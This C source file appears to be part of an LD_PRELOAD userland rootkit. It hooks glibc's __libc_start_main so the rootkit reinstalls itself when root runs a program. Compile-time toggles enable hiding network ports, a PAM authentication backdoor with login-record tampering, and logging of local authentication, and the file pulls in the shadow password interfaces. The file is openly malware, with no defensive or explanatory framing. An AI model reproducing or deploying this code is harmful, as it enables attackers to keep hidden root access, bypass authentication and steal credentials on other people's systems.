#define _GNU_SOURCE

#include "toggles.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fnmatch.h>
#include <dirent.h>
#include <time.h>
#include <dlfcn.h>
#include <link.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>

#ifdef HIDE_PORTS
#include <linux/netlink.h>
#include <pcap/pcap.h>
#endif

#include <pwd.h>
#include <shadow.h>

#ifdef USE_PAM_BD
#include <utmp.h>
#include <utmpx.h>
#endif

#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>
#endif

#include "includes.h"

int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
#ifdef DO_REINSTALL
    if(not_user(0)) goto do_libc_start_main;
    reinstall();
#endif
do_libc_start_main:
    hook(C__LIBC_START_MAIN);
    return (long)call(C__LIBC_START_MAIN, main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}
